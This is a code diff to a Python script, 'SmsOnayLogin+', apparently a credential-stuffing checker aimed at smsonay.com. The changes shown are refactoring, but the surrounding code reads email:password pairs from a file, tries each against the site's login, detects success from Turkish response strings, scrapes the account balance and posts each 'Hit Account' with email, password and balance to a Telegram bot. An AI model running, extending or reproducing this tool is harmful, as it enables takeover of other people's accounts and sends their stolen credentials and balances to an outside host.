@@ -8,6 +8,7 @@ from colorama import Fore, Style, init
 # Initialize colorama
 init(autoreset=True)
 
+# Define colors
 GREY = Fore.LIGHTBLACK_EX
 RED = Fore.RED
 GREEN = Fore.GREEN
@@ -20,26 +21,22 @@ def print_banner(title):
     print(pyfiglet.figlet_format(title, font='smslant') + f"{GREEN}                       Github: SPARUX-666 </>\n")
     print(f"{GREEN}{'━'*67}{RESET}")
 
-print_banner('SmsOnayLogin+')
-
 def read_credentials_from_file(file_name):
+    credentials = []
     try:
         with open(file_name, "r", encoding="utf-8") as file:
             lines = file.readlines()
-            credentials = []
             for line in lines:
                 parts = line.strip().split(":")
                 if len(parts) == 2:
                     credentials.append(parts)
                 else:
                     print(RED + f"❌ Invalid Format: {line.strip()} - Expected format email:password")
-            return credentials
     except FileNotFoundError:
         print(RED + "❌ File not found!")
-        return []
     except Exception as error:
         print(RED + f"❌ File reading error: {error}")
-        return []
+    return credentials
 
 def login(email, password, user_agent):
     try:
@@ -51,16 +48,14 @@ def login(email, password, user_agent):
             "Accept": "*/*",
             "Content-Type": "application/x-www-form-urlencoded"
         }
-        data = urllib.parse.urlencode({
-            "email": email,
-            "password": password
-        })
+        data = urllib.parse.urlencode({"email": email, "password": password})
 
         connection = http.client.HTTPSConnection(login_url)
         connection.request("POST", path, body=data, headers=headers)
         response = connection.getresponse()
         data = response.read()
         cookies = response.getheader("Set-Cookie")
+        connection.close()
         return response.status, data, cookies
     except Exception as error:
         print(RED + f"❌ Request error: {error}")
@@ -79,6 +74,7 @@ def get_balance(cookies, user_agent):
         connection.request("GET", path, headers=headers)
         response = connection.getresponse()
         data = response.read()
+        connection.close()
         if response.status == 200:
             return parse_balance(data.decode())
         else:
@@ -108,14 +104,12 @@ def parse_balance(html):
 def send_telegram_message(bot_token, chat_id, message):
     try:
         api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-        params = urllib.parse.urlencode({
-            "chat_id": chat_id,
-            "text": message
-        })
+        params = urllib.parse.urlencode({"chat_id": chat_id, "text": message})
         connection = http.client.HTTPSConnection("api.telegram.org")
         connection.request("GET", f"/bot{bot_token}/sendMessage?{params}")
         response = connection.getresponse()
         response_text = response.read().decode()
+        connection.close()
         if response.status != 200:
             print(RED + f"❌ Failed to send to bot: {response_text}")
     except Exception as error:
@@ -134,13 +128,13 @@ def scan_accounts(file_name, bot_token, chat_id, success_message):
     ]
 
     failed_conditions = [
-        "Giri\\u015f Ba\\u015far\\u0131s\\u0131z!\",\"message\":\"L\\u00fctfen email ve parolay\\u0131 kontrol edip tekrar deneyin.",
+        "Giriş Başarısız!\",\"message\":\"Lütfen email ve parolayı kontrol edip tekrar deneyin.",
         "{\"success\":false,\"",
-        "L\\u00fctfen email ve parolay\\u0131 kontrol edip tekrar deneyin."
+        "Lütfen email ve parolayı kontrol edip tekrar deneyin."
     ]
     success_conditions = [
-        "Giri\\u015f Ba\\u015far\\u0131l\\u0131!",
-        "Ba\\u015far\\u0131yla giri\\u015f yapt\\u0131n\\u0131z."
+        "Giriş Başarılı!",
+        "Başarıyla giriş yaptınız."
     ]
 
     for email, password in credentials:
@@ -163,6 +157,7 @@ def scan_accounts(file_name, bot_token, chat_id, success_message):
             print(f"❌ {RED} {email} : An unknown error occurred.")
 
 def main():
+    print_banner('SmsOnayLogin+')
     bot_token = input(f"{BLUE}Enter Bot Token: {GREY}")
     chat_id = input(f"{BLUE}Enter Telegram ID: {GREY}")
     success_message = "smsonay.com\nHit Account\nEmail: {email}\nPassword: {password}\nBalance: {balance}\nGithub: Github.com/Sparux-666"
